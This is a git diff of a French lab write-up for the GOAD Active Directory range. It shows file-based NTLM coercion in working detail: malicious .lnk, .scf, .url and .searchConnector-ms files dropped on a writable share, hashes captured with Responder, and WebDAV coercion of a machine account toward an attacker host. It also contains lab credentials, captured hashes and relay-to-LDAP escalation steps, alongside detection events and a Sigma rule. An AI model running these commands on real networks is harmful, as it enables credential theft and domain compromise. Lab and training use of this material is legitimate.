@@ -1,75 +1,111 @@
-# SC-AD-011 — Coerce & Attaques par Fichiers Malveillants
+# SC-AD-011 — Coerce & File-based Attacks
+
+**HikenRoot Forge — MediaTech Groupe SA**
+
+---
 
 ## Classification
 
-| Champ | Valeur |
-|-------|--------|
-| **Code scénario** | SC-AD-011 |
-| **Nom** | Coerce & Attaques par Fichiers — Authentification Forcée via Fichiers Malveillants |
-| **Cible** | CASTELBLACK (192.168.10.22) — SRV north.sevenkingdoms.local / BRAAVOS (192.168.10.23) — SRV essos.local |
-| **VLAN** | 10 — AD Lab (192.168.10.0/24) |
-| **Sévérité** | 🔴 Critique |
-| **CVSS 3.1** | 8.1 (AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N) |
-| **MITRE ATT&CK** | T1187 (Forced Authentication), T1557 (Adversary-in-the-Middle), T1071.001 (Web Protocols) |
-| **Référence Mayfly** | Part 13 — https://mayfly277.github.io/posts/GOADv2-pwning-part13/ |
-| **Prérequis** | Compte de domaine avec accès en écriture sur un share SMB (arya.stark:Needle) |
-| **Résultat** | Capture de hash NTLMv2 (comptes utilisateur + machine) via coercion SMB et HTTP |
-| **Date** | Mars 2026 |
+| Attribut | Valeur |
+|----------|--------|
+| **Scénario** | SC-AD-011 |
+| **Titre** | Coerce & File-based Attacks — Authentification forcée via fichiers malveillants |
+| **Référence Mayfly** | [Part 13 — Having fun inside a domain](https://mayfly277.github.io/posts/GOADv2-pwning-part13/) |
+| **Certifications** | CRTO |
+| **Sévérité** | Critique (CVSS 3.1 : 8.1) |
+| **MITRE ATT&CK** | T1187, T1557, T1071.001, T1569.002 |
+| **Domaines compromis** | north.sevenkingdoms.local (catelyn.stark), essos.local (khal.drogo, BRAAVOS$) |
+| **Date d'exécution** | 9 mars 2026 |
 | **Auteur** | Nadyr Chouarhi (hik3nR00t) |
 
 ---
 
-## Résumé Exécutif
+## Résumé exécutif
 
 ### Pour un recruteur
 
-Ce scénario démontre cinq techniques de coercion par fichiers qui forcent les utilisateurs Windows à s'authentifier vers un serveur contrôlé par l'attaquant simplement en **visitant un dossier partagé** — sans aucun clic. En déposant des fichiers spécialement conçus (.lnk, .scf, .url, .searchConnector-ms) sur un partage SMB inscriptible, l'attaquant capture des hash NTLMv2 exploitables par cracking offline ou relay. La technique la plus avancée (coercion WebDAV) active le service WebClient sur la machine victime, permettant une authentification HTTP relayable vers LDAP pour l'escalade de privilèges — une technique invisible au monitoring SMB standard.
+Ce scénario démontre cinq techniques de coercion par fichiers qui forcent les utilisateurs Windows à s'authentifier vers un serveur contrôlé par l'attaquant simplement en **visitant un dossier partagé** — sans aucun clic. En déposant des fichiers spécialement conçus (.lnk, .scf, .url, .searchConnector-ms) sur un partage SMB inscriptible, l'attaquant capture des hash NTLMv2 exploitables par cracking offline ou relay. La technique la plus avancée (coercion WebDAV) active le service WebClient sur la machine victime, permettant une authentification HTTP relayable vers LDAP pour l'escalade de privilèges — une technique invisible au monitoring SMB standard. L'impact inter-domaines est démontré : un fichier sur CASTELBLACK (north) capture les credentials de khal.drogo (essos).
 
 ### Pour un auditeur ISO 27001 / NIS2
 
-- **A.8.2 (Droits d'accès privilégiés)** — Le partage `all` sur CASTELBLACK accorde READ/WRITE à tous les utilisateurs du domaine. Aucun contrôle d'accès ne restreint l'upload de fichiers aux comptes autorisés.
-- **A.8.15 (Journalisation)** — Aucun monitoring ne détecte la création de fichiers de coercion (.lnk, .scf, .url, .searchConnector-ms) sur les dossiers partagés. Aucune alerte sur l'activation du service WebClient.
-- **A.8.9 (Gestion de la configuration)** — Le service WebClient est installé sur BRAAVOS (Windows Server 2016) sans justification métier. Ce service devrait être désactivé sur tous les serveurs.
-- **NIS2 Article 21 §2(d)** — Absence de contrôles sur la chaîne d'approvisionnement : des fichiers malveillants déposés par n'importe quel utilisateur propagent le vol de credentials à travers les frontières de confiance (north.sevenkingdoms.local → essos.local).
+- **ISO 27001 — A.8.2 (Droits d'accès privilégiés)** : le partage `all` sur CASTELBLACK accorde READ/WRITE à tous les utilisateurs du domaine. Aucun contrôle d'accès ne restreint l'upload de fichiers aux comptes autorisés. N'importe quel utilisateur peut déposer un fichier de coercion.
+- **ISO 27001 — A.8.9 (Gestion de la configuration)** : le service WebClient est installé sur BRAAVOS (Windows Server 2016) sans justification métier. Ce service, conçu pour les postes clients, permet les attaques de relay HTTP→LDAP contournant le SMB signing.
+- **ISO 27001 — A.8.15 (Journalisation)** : aucun monitoring ne détecte la création de fichiers de coercion (.lnk, .scf, .url, .searchConnector-ms) sur les dossiers partagés. Aucune alerte sur l'activation du service WebClient.
+- **NIS2 — Article 21 §2(d)** : les fichiers malveillants déposés par n'importe quel utilisateur propagent le vol de credentials à travers les frontières de confiance (north.sevenkingdoms.local → essos.local). Le trust inter-domaines ne protège pas contre la coercion par fichiers.
 
 ### Pour un RSSI
 
-Les attaques de coercion par fichiers ne nécessitent qu'un compte de domaine standard et un partage inscriptible — des conditions présentes dans pratiquement tous les environnements Active Directory. L'attaque est silencieuse (pas de logs, aucune interaction utilisateur au-delà de la visite d'un dossier), scalable (un seul fichier compromet chaque utilisateur qui visite le share) et inter-domaines (un fichier sur CASTELBLACK a coercé khal.drogo depuis essos.local). La variante WebDAV permet des attaques de relay LDAP qui contournent entièrement le SMB signing. La remédiation immédiate nécessite la restriction des accès en écriture sur les partages, la désactivation du WebClient sur les serveurs et le déploiement d'un monitoring d'intégrité des fichiers.
+Les attaques de coercion par fichiers ne nécessitent qu'un compte de domaine standard et un partage inscriptible — des conditions présentes dans pratiquement tous les environnements AD. L'attaque est silencieuse (pas de logs, aucune interaction au-delà de la visite d'un dossier), scalable (un seul fichier compromet chaque utilisateur qui visite le share) et inter-domaines. La variante WebDAV est la plus dangereuse : le .searchConnector-ms démarre le service WebClient, puis coercer déclenche une auth HTTP relayable vers LDAP pour RBCD ou Shadow Credentials — contournant entièrement le SMB signing. Remédiation immédiate : restreindre les droits d'écriture sur les partages, désactiver WebClient sur tous les serveurs, déployer un FIM sur les dossiers partagés.
+
+---
+
+## Diagramme réseau
+
+```mermaid
+graph TB
+    subgraph "north.sevenkingdoms.local"
+        WF["WINTERFELL<br/>192.168.10.11<br/>DC02<br/>catelyn.stark (RDP)"]
+        CB["CASTELBLACK<br/>192.168.10.22<br/>SRV — signing:False<br/>Share 'all' READ/WRITE"]
+    end
+
+    subgraph "essos.local"
+        BR["BRAAVOS<br/>192.168.10.23<br/>SRV — signing:False<br/>WebClient installé"]
+    end
+
+    KALI["KALI<br/>10.10.10.2<br/>(WireGuard)<br/>Responder + coercer"]
+
+    KALI -->|"1. Dépose .lnk/.scf/.url<br/>sur \\castelblack\all"| CB
+    WF -->|"2. catelyn visite share<br/>→ NTLMv2 SMB"| KALI
+    KALI -->|"3. Dépose .searchConnector-ms"| CB
+    BR -->|"4. khal.drogo visite share<br/>→ NTLMv2 + WebClient start"| KALI
+    KALI -->|"5. dnstool + coercer<br/>→ HTTP coerce BRAAVOS$"| BR
+
+    style CB fill:#ff4444,stroke:#333,color:#fff
+    style BR fill:#ff8800,stroke:#333,color:#fff
+    style KALI fill:#00aa00,stroke:#333,color:#fff
+```
 
 ---
 
 ## Kill Chain
 
-```
-Phase 1 : Reconnaissance
-├── Énumération des partages inscriptibles (netexec --shares)
-├── Cible identifiée : CASTELBLACK share "all" (READ/WRITE pour tous)
-└── Signing identifié : CASTELBLACK (False), BRAAVOS (False)
+```mermaid
+graph LR
+    A["Enum shares<br/>netexec --shares<br/>all: READ/WRITE"] --> B["Fichier .lnk<br/>slinky module<br/>catelyn.stark<br/>NTLMv2 SMB"]
+    A --> C["Fichier .scf<br/>scuffy module<br/>catelyn.stark<br/>NTLMv2 SMB"]
+    A --> D["Fichier .url<br/>upload manuel<br/>catelyn.stark<br/>NTLMv2 SMB"]
+    A --> E["searchConnector-ms<br/>drop-sc module<br/>khal.drogo<br/>NTLMv2 + WebClient"]
+    E --> F["WebDAV coerce<br/>dnstool + coercer<br/>BRAAVOS$ machine<br/>NTLMv2 HTTP"]
+    F --> G["[Production]<br/>ntlmrelayx HTTP→LDAP<br/>RBCD / Shadow Creds<br/>→ DA essos.local"]
 
-Phase 2 : Coercion par fichiers (SMB)
-├── Technique 1 : fichier .lnk via module slinky → NTLMv2 catelyn.stark
-├── Technique 2 : fichier .scf via module scuffy → NTLMv2 catelyn.stark
-├── Technique 3 : fichier .url via upload manuel → NTLMv2 catelyn.stark
-└── Technique 4 : .searchConnector-ms via drop-sc → NTLMv2 khal.drogo + activation WebClient
-
-Phase 3 : Coercion WebDAV (HTTP)
-├── Vérification WebClient actif sur BRAAVOS
-├── Ajout enregistrement DNS (dnstool.py) → attacker.north.sevenkingdoms.local
-├── Coercion BRAAVOS$ via coercer (HTTP) → NTLMv2 compte machine
-└── [Production] Relay HTTP vers LDAP → RBCD / Shadow Credentials
-
-Phase 4 : Nettoyage
-├── Suppression de tous les fichiers malveillants des shares
-└── Suppression de l'enregistrement DNS
+    style B fill:#ff4444,stroke:#333,color:#fff
+    style C fill:#ff4444,stroke:#333,color:#fff
+    style D fill:#ff4444,stroke:#333,color:#fff
+    style E fill:#ff8800,stroke:#333,color:#fff
+    style F fill:#ff8800,stroke:#333,color:#fff
+    style G fill:#cc0000,stroke:#333,color:#fff
 ```
 
 ---
 
-## Exploitation
+## Scope & Méthodologie
 
-### Phase 1 — Reconnaissance
+| Élément | Détail |
+|---------|--------|
+| **Périmètre** | GOAD v3 — shares inscriptibles sur CASTELBLACK, WebClient sur BRAAVOS |
+| **Machine d'attaque** | Kali Linux 10.10.10.2 (WireGuard) |
+| **Outils** | Responder 3.1.6, netexec (modules slinky/scuffy/drop-sc/webdav), coercer, dnstool.py (krbrelayx), impacket-smbclient |
+| **Référence** | mayfly277 GOAD Part 13, Gabriel Prud'homme — Coerce Talk |
+| **Prérequis** | Compte domain user avec accès en écriture sur un share (arya.stark:Needle) |
+| **Approche** | Exploitation manuelle — pas de Metasploit |
 
-**Énumération des partages inscriptibles sur CASTELBLACK :**
+---
+
+## Phases d'exploitation
+
+### Phase 1 — Reconnaissance des partages inscriptibles
+
+**1. Énumération des shares**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares
@@ -82,19 +118,21 @@ SMB   192.168.10.22   445   CASTELBLACK   all      READ,WRITE    Basic RW share 
 SMB   192.168.10.22   445   CASTELBLACK   public   READ,WRITE    Basic Read share for all domain users
 ```
 
-> **Constat :** Deux partages inscriptibles par n'importe quel utilisateur du domaine. Le share `all` est la cible idéale pour la coercion par fichiers.
+Deux partages inscriptibles par n'importe quel utilisateur du domaine. Le share `all` est la cible idéale.
+
+---
 
 ### Phase 2 — Coercion par fichiers (SMB)
 
-**Préparation :** Responder en écoute en mode verbose pour capturer tous les hash NTLMv2.
+**Préparation** : Responder en écoute en mode verbose. Le flag `-v` est critique — sans lui, le cache SQLite (`Responder.db`) ignore les hash déjà vus.
 
 ```bash
+# Reset complet du cache Responder (indispensable entre les techniques)
+sudo rm /usr/share/responder/Responder.db /usr/share/responder/logs/*
 sudo responder -I wg-goad -v
 ```
 
-> **Astuce :** Utiliser le flag `-v` pour afficher les hash en doublon. Sans ce flag, le cache SQLite de Responder (`Responder.db`) ignore les hash déjà vus. Pour un reset complet : `sudo rm /usr/share/responder/Responder.db /usr/share/responder/logs/*`
-
-**Simulation victime :** Session RDP en tant que catelyn.stark sur WINTERFELL, navigation vers `\\castelblack\all`.
+**Simulation victime** : session RDP catelyn.stark sur WINTERFELL, navigation vers `\\castelblack\all`.
 
 ```bash
 xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:192.168.10.11 /cert-ignore
@@ -102,7 +140,9 @@ xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryaric
 
 #### Technique 1 — Fichier .lnk (slinky)
 
-Un fichier .lnk (raccourci) contient une référence UNC pour son icône. Quand l'Explorateur Windows affiche le contenu du dossier, il tente de résoudre le chemin de l'icône — envoyant le hash NTLMv2 de l'utilisateur vers l'attaquant sans aucun clic.
+Un fichier .lnk contient une référence UNC pour son icône. Quand l'Explorateur Windows affiche le contenu du dossier, il tente de résoudre le chemin de l'icône — envoyant le hash NTLMv2 de l'utilisateur vers l'attaquant **sans aucun clic**.
+
+**2. Dépôt du fichier .lnk**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
@@ -111,9 +151,10 @@ netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local
 
 ```
 SLINKY   192.168.10.22   445   CASTELBLACK   [+] Created LNK file on the all share
+SLINKY   192.168.10.22   445   CASTELBLACK   [+] Created LNK file on the public share
 ```
 
-**Résultat :** Dès que catelyn.stark visite `\\castelblack\all` :
+**3. Capture du hash** — catelyn.stark visite `\\castelblack\all` :
 
 ```
 [SMB] NTLMv2-SSP Client   : 192.168.10.11
@@ -121,18 +162,22 @@ SLINKY   192.168.10.22   445   CASTELBLACK   [+] Created LNK file on the all sha
 [SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:232552275e17536d:1AE4B6CC320CE642A839908509D6CC04:0101...
 ```
 
-> **Aucun clic nécessaire.** Le hash est capturé automatiquement dès que la victime entre dans le dossier.
+Aucun clic nécessaire. Le hash est capturé automatiquement dès l'entrée dans le dossier.
 
-**Nettoyage :**
+**4. Nettoyage**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
   -M slinky -o NAME=desktop.lnk SERVER=10.10.10.2 CLEANUP=true
 ```
 
+---
+
 #### Technique 2 — Fichier .scf (scuffy)
 
-Un fichier .scf (Shell Command File) utilise une directive `IconFile` pointant vers un chemin UNC. Windows résout l'icône à l'entrée dans le dossier.
+Un fichier .scf (Shell Command File) utilise une directive `IconFile` pointant vers un chemin UNC. Même mécanisme que le .lnk — Windows résout l'icône à l'entrée dans le dossier.
+
+**5. Dépôt du fichier .scf**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
@@ -143,24 +188,30 @@ netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local
 SCUFFY   192.168.10.22   445   CASTELBLACK   [+] Created SCF file on the all share
 ```
 
-**Résultat :** Hash NTLMv2 capturé — même comportement que le .lnk, confirmé fonctionnel sur Windows Server 2019.
+**6. Capture du hash** — catelyn visite le share :
 
 ```
 [SMB] NTLMv2-SSP Client   : 192.168.10.11
 [SMB] NTLMv2-SSP Username : NORTH\catelyn.stark
-[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:...
+[SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:867d179d749ceb90:0E9EC5ACB4A3DAE5EE729106F00427CF:0101...
 ```
 
-**Nettoyage :**
+Confirmé fonctionnel sur Windows Server 2019.
+
+**7. Nettoyage**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
   -M scuffy -o NAME=desktop.scf SERVER=10.10.10.2 CLEANUP=true
 ```
 
+---
+
 #### Technique 3 — Fichier .url (manuel)
 
-Un fichier .url (raccourci Internet) avec un chemin UNC dans `IconFile` déclenche le même comportement de résolution automatique.
+Un fichier .url (raccourci Internet) avec un chemin UNC dans `IconFile` déclenche le même comportement de résolution automatique. Contrairement aux deux techniques précédentes, le fichier est créé et uploadé manuellement.
+
+**8. Création et upload du fichier .url**
 
 ```bash
 cat > /tmp/clickme.url << 'EOF'
@@ -178,7 +229,7 @@ impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
 # put /tmp/clickme.url
 ```
 
-**Résultat :** Hash NTLMv2 capturé à la visite du dossier.
+**9. Capture du hash** — catelyn visite le share :
 
 ```
 [SMB] NTLMv2-SSP Client   : 192.168.10.11
@@ -186,7 +237,7 @@ impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
 [SMB] NTLMv2-SSP Hash     : catelyn.stark::NORTH:98356f3c6a8fcbf2:F3102A6C003FF2C6BAF5D471FE1331BC:0101...
 ```
 
-**Nettoyage :**
+**10. Nettoyage**
 
 ```bash
 impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
@@ -194,9 +245,13 @@ impacket-smbclient north.sevenkingdoms.local/arya.stark:Needle@192.168.10.22
 # rm clickme.url
 ```
 
+---
+
 #### Technique 4 — .searchConnector-ms (drop-sc)
 
-Un fichier .searchConnector-ms a un double effet : il capture des hash NTLMv2 ET **démarre le service WebClient** sur la machine de la victime. C'est critique car le WebClient permet une authentification HTTP relayable vers LDAP (contrairement au SMB).
+Le .searchConnector-ms a un **double effet** : capture de hash NTLMv2 ET **démarrage du service WebClient** sur la machine de la victime. Le WebClient permet une authentification HTTP relayable vers LDAP — c'est ce qui rend cette technique bien plus dangereuse que les trois précédentes.
+
+**11. Dépôt du fichier .searchConnector-ms**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
@@ -207,13 +262,13 @@ netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local
 DROP-SC   192.168.10.22   445   CASTELBLACK   [+] Created Documents.searchConnector-ms file on the all share
 ```
 
-**Victime :** khal.drogo (essos.local) connecté en RDP sur BRAAVOS, visite `\\castelblack\all`.
+**12. Changement de victime** — khal.drogo (essos.local) connecté en RDP sur BRAAVOS, visite `\\castelblack\all` :
 
 ```bash
 xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:192.168.10.23 /cert-ignore
 ```
 
-**Résultat — Capture de hash inter-domaines :**
+**13. Capture inter-domaines + activation WebClient**
 
 ```
 [SMB] NTLMv2-SSP Client   : 192.168.10.23
@@ -221,9 +276,9 @@ xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:192.168.10.23 /cert-ignore
 [SMB] NTLMv2-SSP Hash     : khal.drogo::ESSOS:0b7618234d43ad72:E4523B1F3C08608E313C6AB5C908172B:0101...
 ```
 
-> **Impact inter-domaines :** Un fichier sur CASTELBLACK (north.sevenkingdoms.local) a capturé les credentials de khal.drogo (essos.local). Les frontières de confiance ne protègent pas contre la coercion par fichiers.
+Impact inter-domaines démontré : un fichier sur CASTELBLACK (north) capture les credentials de khal.drogo (essos). Les frontières de confiance ne protègent pas contre la coercion par fichiers.
 
-**Vérification de l'activation du WebClient sur BRAAVOS :**
+**14. Vérification WebClient actif sur BRAAVOS**
 
 ```bash
 netexec smb 192.168.10.23 -u khal.drogo -p 'horse' -d essos.local -M webdav
@@ -233,13 +288,19 @@ netexec smb 192.168.10.23 -u khal.drogo -p 'horse' -d essos.local -M webdav
 WEBDAV   192.168.10.23   445   BRAAVOS   WebClient Service enabled on: 192.168.10.23
 ```
 
-> **Le WebClient est maintenant actif.** Cela débloque la Phase 3 — coercion HTTP.
+Le WebClient est maintenant actif — Phase 3 débloquée.
+
+---
 
 ### Phase 3 — Coercion WebDAV (HTTP)
 
-Avec le WebClient actif sur BRAAVOS, on peut coercer une authentification HTTP. L'auth HTTP est relayable vers LDAP (contrairement à l'auth SMB), permettant l'escalade de privilèges via RBCD ou Shadow Credentials.
+Avec le WebClient actif sur BRAAVOS, on peut coercer une authentification HTTP. L'auth HTTP est **relayable vers LDAP** (contrairement à l'auth SMB), permettant l'escalade de privilèges via RBCD ou Shadow Credentials.
 
-**Étape 1 — Ajout d'un enregistrement DNS pointant vers l'IP de l'attaquant :**
+**Pourquoi l'HTTP est plus dangereux que le SMB** : le SMB signing bloque le relay SMB→LDAP. Mais l'auth HTTP via WebClient n'est pas concernée par le SMB signing — elle est relayable vers n'importe quel service, y compris LDAP. C'est le vecteur qui transforme une simple capture de hash en compromission complète.
+
+**15. Ajout d'un enregistrement DNS pointant vers l'attaquant**
+
+Le WebClient nécessite un hostname (pas une IP) pour déclencher l'auth HTTP. On ajoute un enregistrement DNS A via LDAP.
 
 ```bash
 python3 /opt_test/krbrelayx/dnstool.py \
@@ -251,16 +312,14 @@ python3 /opt_test/krbrelayx/dnstool.py \
 [+] LDAP operation completed successfully
 ```
 
-> **Pourquoi le DNS ?** Le WebClient nécessite un hostname (pas une IP) pour déclencher l'auth HTTP. On ajoute un enregistrement DNS A qui résout vers notre IP attaquant.
-
-**Étape 2 — Coercion de BRAAVOS via HTTP avec coercer :**
+**16. Coercion HTTP de BRAAVOS$ via coercer**
 
 ```bash
 coercer coerce -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
   -t 192.168.10.23 -l attacker.north.sevenkingdoms.local --always-continue
 ```
 
-**Résultat — Coercion HTTP + hash compte machine :**
+**17. Résultat — hash compte machine + coercion HTTP**
 
 ```
 [SMB] NTLMv2-SSP Client   : 192.168.10.23
@@ -272,12 +331,12 @@ coercer coerce -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
 [HTTP] Sending NTLM authentication request to 192.168.10.23
 ```
 
-> **Observation clé :** Les coercions SMB et HTTP sont déclenchées simultanément. Les lignes `[HTTP]` confirment que le WebClient traite les requêtes d'authentification HTTP. Dans une attaque en production, `ntlmrelayx` remplacerait Responder pour relayer l'auth HTTP vers LDAP et réaliser :
-> - **Attaque RBCD :** Créer un compte machine → déléguer vers BRAAVOS$ → impersonation Administrator
-> - **Shadow Credentials :** Injecter msDS-KeyCredentialLink sur BRAAVOS$ → authentification par certificat
-> - **Modification d'ACL :** Ajouter des privilèges à un compte contrôlé
+Les coercions SMB et HTTP sont déclenchées simultanément. Les lignes `[HTTP]` confirment que le WebClient traite les requêtes d'authentification HTTP. En production, `ntlmrelayx` remplacerait Responder pour relayer l'auth HTTP vers LDAP :
+- **RBCD** : créer un compte machine → déléguer vers BRAAVOS$ → impersonation Administrator
+- **Shadow Credentials** : injecter msDS-KeyCredentialLink sur BRAAVOS$ → auth par certificat
+- **Modification d'ACL** : ajouter des privilèges à un compte contrôlé
 
-**Nettoyage :**
+**18. Nettoyage complet**
 
 ```bash
 netexec smb 192.168.10.22 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local \
@@ -288,120 +347,41 @@ python3 /opt_test/krbrelayx/dnstool.py \
   -a remove -r 'attacker.north.sevenkingdoms.local' -d 10.10.10.2 192.168.10.11
 ```
 
----
-
-## Cartographie MITRE ATT&CK
-
-| Technique | Tactique | ID | Description |
-|-----------|----------|----|-------------|
-| Forced Authentication | Accès aux identifiants | T1187 | Coercion NTLMv2 via fichiers malveillants (.lnk, .scf, .url, .searchConnector-ms) |
-| Adversary-in-the-Middle | Accès aux identifiants | T1557 | Capture de hash NTLMv2 via Responder |
-| Web Protocols | Commande & Contrôle | T1071.001 | Coercion WebDAV via protocole HTTP |
-| System Services | Exécution | T1569.002 | Activation du service WebClient via .searchConnector-ms |
-| Account Manipulation | Persistance | T1098 | RBCD/Shadow Credentials via relay LDAP (scénario production) |
-
----
-
-## Score CVSS 3.1
-
-**Vecteur :** AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N — **Score : 8.1 (Élevé)**
-
-| Métrique | Valeur | Justification |
-|----------|--------|---------------|
-| Vecteur d'attaque | Réseau | Exploitation distante via partage SMB |
-| Complexité d'attaque | Basse | Outils standards, un partage inscriptible suffit |
-| Privilèges requis | Bas | N'importe quel utilisateur du domaine avec accès en écriture |
-| Interaction utilisateur | Requise | La victime doit visiter le share (aucun clic nécessaire) |
-| Confidentialité | Élevée | La capture de hash NTLMv2 permet le cracking offline ou le relay |
-| Intégrité | Élevée | Le relay HTTP permet la modification de comptes (RBCD, Shadow Creds) |
-| Disponibilité | Aucune | Pas d'interruption de service |
-
----
-
-## Impact Financier — MediaTech Groupe SA
-
-| Catégorie d'impact | Coût estimé | Base |
-|-------------------|-------------|------|
-| Réponse à incident | 45 000 € – 90 000 € | Analyse forensique de tous les dossiers partagés + rotation des credentials |
-| Interruption d'activité | 30 000 € – 60 000 € | Restrictions d'accès aux partages pendant la remédiation (2-5 jours) |
-| Amendes réglementaires (NIS2) | 100 000 € – 500 000 € | Non-conformité aux contrôles d'accès sur les ressources partagées |
-| Dommage réputationnel | 50 000 € – 150 000 € | Le vol de credentials inter-domaines démontre une défaillance systémique |
-| **Impact total estimé** | **225 000 € – 800 000 €** | |
-
----
-
-## Analyse Réglementaire
-
-### ISO 27001:2022
-
-| Contrôle | Écart | Risque |
-|----------|-------|--------|
-| A.8.2 — Droits d'accès privilégiés | Partages inscriptibles accessibles à tous les utilisateurs du domaine | N'importe quel utilisateur peut déposer des fichiers de coercion |
-| A.8.9 — Gestion de la configuration | WebClient activé sur les serveurs sans justification métier | Permet les attaques de relay HTTP contournant le SMB signing |
-| A.8.15 — Journalisation | Aucune détection de la création de fichiers malveillants sur les partages | Vol de credentials silencieux à grande échelle |
-| A.8.16 — Activités de surveillance | Aucun monitoring d'intégrité des fichiers sur les dossiers partagés | Les fichiers de coercion persistent sans détection |
-
-### Directive NIS2
-
-| Article | Exigence | Écart |
-|---------|----------|-------|
-| Art. 21 §2(a) — Analyse des risques | Permissions d'écriture sur les partages non évaluées en termes de risque | Écriture non restreinte = vecteur de vol de credentials |
-| Art. 21 §2(d) — Chaîne d'approvisionnement | La confiance inter-domaines permet le vol de credentials au-delà des frontières | Compromission north → essos via fichier partagé |
-| Art. 21 §2(e) — Gestion des vulnérabilités | Service WebClient non durci sur les serveurs | Vecteur d'attaque connu depuis 2022 |
-
----
-
-## Décisions COMEX
-
-| Priorité | Décision | Investissement | Délai |
-|----------|----------|----------------|-------|
-| CRITIQUE | Restreindre l'accès en écriture sur tous les dossiers partagés aux groupes autorisés uniquement | 5 000 € (revue GPO) | 0-48h |
-| CRITIQUE | Désactiver le service WebClient sur tous les serveurs | 0 € (GPO) | 0-24h |
-| ÉLEVÉ | Déployer un monitoring d'intégrité des fichiers (FIM) sur les dossiers partagés | 15 000-30 000 €/an | 1-2 semaines |
-| ÉLEVÉ | Activer l'audit SMB avancé (Event ID 5145) sur les serveurs de fichiers | 0 € (GPO) | 1 semaine |
-| MOYEN | Imposer le SMB signing sur toutes les machines (pas seulement les DC) | 5 000 € (tests) | 2-4 semaines |
-| MOYEN | Segmentation réseau pour empêcher l'accès aux partages inter-VLAN | 20 000-40 000 € | 1-3 mois |
-
----
-
-## Remédiation
-
-### Immédiat (0-48h)
-
-**Désactiver le WebClient sur tous les serveurs :**
-
-```powershell
-# GPO : Configuration ordinateur → Paramètres Windows → Services système
-# WebClient → Désactivé
-Stop-Service WebClient -Force
-Set-Service WebClient -StartupType Disabled
+```
+[+] LDAP operation completed successfully
 ```
 
-**Restreindre l'accès en écriture sur les partages :**
+---
 
-```powershell
-# Supprimer l'accès "Tout le monde" et "Utilisateurs du domaine" en écriture
-# Remplacer par des groupes de sécurité spécifiques
-Revoke-SmbShareAccess -Name "all" -AccountName "Everyone" -Force
-Grant-SmbShareAccess -Name "all" -AccountName "NORTH\Share-Writers" -AccessRight Change -Force
-```
+## Synthèse des techniques
 
-### Court terme (1-4 semaines)
+| # | Technique | Outil | Victime | Hash capturé | Protocole | Particularité |
+|---|-----------|-------|---------|-------------|-----------|---------------|
+| 1 | .lnk | netexec slinky | catelyn.stark (NORTH) | NTLMv2 user | SMB | Auto-trigger sur visite dossier |
+| 2 | .scf | netexec scuffy | catelyn.stark (NORTH) | NTLMv2 user | SMB | Confirmé WS2019 |
+| 3 | .url | upload manuel | catelyn.stark (NORTH) | NTLMv2 user | SMB | Pas de module netexec |
+| 4 | .searchConnector-ms | netexec drop-sc | khal.drogo (ESSOS) | NTLMv2 user | SMB | **Démarre WebClient** + inter-domaines |
+| 5 | WebDAV coerce | coercer + dnstool | BRAAVOS$ (ESSOS) | NTLMv2 machine | **HTTP** | Relayable vers LDAP |
 
-**Activer l'audit SMB sur les serveurs de fichiers :**
+---
 
-```powershell
-# Activer l'audit d'accès aux objets
-auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
-```
+## Détection SIEM
 
-**Déployer une règle Sigma pour la détection des fichiers de coercion :**
+### Event IDs critiques
+
+| Event ID | Source | Description |
+|----------|--------|-------------|
+| 5145 | Security | Detailed File Share — création de fichiers sur les partages |
+| 7036 | System | Changement d'état de service — WebClient start/stop |
+| 8001 | DNS Server | Création d'enregistrement DNS via LDAP |
+
+### Sigma Rules
 
 ```yaml
-title: Création de fichier suspect sur un partage SMB
-id: f5a8e1c3-7b2d-4e8f-9c3a-1d5e7f2a8b4c
+title: Fichier de coercion créé sur un partage SMB
+id: sc-ad-011-001
 status: experimental
-description: Détecte la création de types de fichiers de coercion connus sur les partages SMB
+description: Détecte la création de fichiers de coercion connus sur les partages SMB
 logsource:
     product: windows
     service: security
@@ -419,44 +399,15 @@ falsepositives:
     - Fichiers raccourcis légitimes créés par les administrateurs
 level: high
 tags:
-    - attack.t1187
     - attack.credential_access
+    - attack.t1187
 ```
-
-### Long terme (1-3 mois)
-
-**Imposer le SMB signing sur toutes les machines :**
-
-```powershell
-# GPO : Configuration ordinateur → Stratégies → Paramètres Windows → Paramètres de sécurité
-# → Stratégies locales → Options de sécurité
-# Serveur réseau Microsoft : Signer numériquement les communications (toujours) → Activé
-# Client réseau Microsoft : Signer numériquement les communications (toujours) → Activé
-```
-
-**Déployer un monitoring d'intégrité des fichiers (FIM) :**
-
-Surveiller tous les dossiers partagés pour la création de fichiers .lnk, .scf, .url, .searchConnector-ms avec alertes automatisées et mise en quarantaine.
-
----
-
-## Détection SOC
-
-### Event IDs à surveiller
-
-| Event ID | Source | Description |
-|----------|--------|-------------|
-| 5145 | Security | Detailed File Share — détecte la création de fichiers sur les partages |
-| 7045 | System | Installation de service — détecte le démarrage du WebClient |
